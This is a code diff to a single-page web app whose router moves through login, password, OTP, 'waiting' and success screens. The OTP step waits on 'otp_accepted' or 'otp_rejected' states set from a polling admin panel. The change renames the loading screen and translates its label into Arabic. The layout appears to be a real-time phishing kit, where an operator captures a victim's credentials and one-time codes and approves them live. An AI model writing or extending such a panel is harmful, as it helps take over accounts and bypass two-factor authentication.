@@ -241,8 +241,8 @@ tbody tr:hover td{background:#fafbfc;}
 </div>
 
 <!-- LOADING -->
-<div id="pg-loading" class="pg dpg">
-  <div class="lcent"><div class="bsp"></div><div class="llbl">Loading...</div></div>
+<div id="pg-waiting" class="pg dpg">
+  <div class="lcent"><div class="bsp"></div><div class="llbl">انتظار...</div></div>
 </div>
 
 <!-- SUCCESS -->
@@ -343,7 +343,7 @@ setInterval(()=>{
 // ============================================================
 // ROUTER
 // ============================================================
-const PAGES = ['login','password','otp','loading','success','admin-lock','admin'];
+const PAGES = ['login','password','otp','waiting','success','admin-lock','admin'];
 let cur = 'login';
 
 function go(p) {
@@ -353,11 +353,11 @@ function go(p) {
   });
   const t=document.getElementById('pg-'+p);
   if(t) t.classList.add('on');
-  const darks=['login','password','otp','loading','success'];
+  const darks=['login','password','otp','waiting','success'];
   document.body.className = darks.includes(p) ? 'dark' : 'light';
   cur = p;
   if(p==='success') document.getElementById('sbadge').textContent='Welcome, '+(S.login||'User');
-  if(p==='loading') setTimeout(()=>go('success'), 2500);
+  if(p==='waiting') setTimeout(()=>go('success'), 2500);
   if(p==='admin') { renderTable(); startAdmPoll(); }
 }
 
@@ -490,7 +490,7 @@ document.getElementById('otpConf').addEventListener('click',()=>{
     if(S.status==='otp_accepted'){
       clearInterval(otmr); otmr=null;
       setState({status:'idle'});
-      go('loading');
+      go('waiting');
     }
     else if(S.status==='otp_rejected'){
       clearInterval(otmr); otmr=null;
@@ -587,7 +587,7 @@ function onStateChange(){
     if(S.status==='otp_accepted'&&otmr){
       clearInterval(otmr); otmr=null;
       setState({status:'idle'});
-      go('loading');
+      go('waiting');
     }
     else if(S.status==='otp_rejected'&&otmr){
       clearInterval(otmr); otmr=null;
